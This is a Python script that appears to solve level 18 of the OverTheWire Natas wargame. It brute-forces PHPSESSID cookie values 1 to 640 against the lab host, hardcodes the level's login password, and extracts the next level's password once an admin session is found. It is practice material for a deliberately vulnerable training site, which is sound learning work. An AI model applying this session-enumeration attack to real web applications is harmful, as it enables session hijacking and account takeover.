import requests
import re

# Constants
username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
url = f'http://{username}.natas.labs.overthewire.org/'
max_session_id = 640

# Create a session object and set the authentication credentials
session = requests.Session()
session.auth = (username, password)

# Iterate over possible session IDs
for session_id in range(1, max_session_id+1):
    # Set the PHPSESSID cookie to the current session ID
    cookies = {'PHPSESSID': str(session_id)}

    # Send a GET request with the PHPSESSID cookie
    response = session.get(url, cookies=cookies)

    # Check if the user is admin
    if 'You are an admin' in response.text:
        # Extract the password from the response using a regular expression
        password = re.search(r'Password: (\w+)', response.text).group(1)

        print(f'The password for natas19 is: {password}')
        break  # Stop iterating if the password is found
    else:
        print(f'Trying session ID: {session_id}')
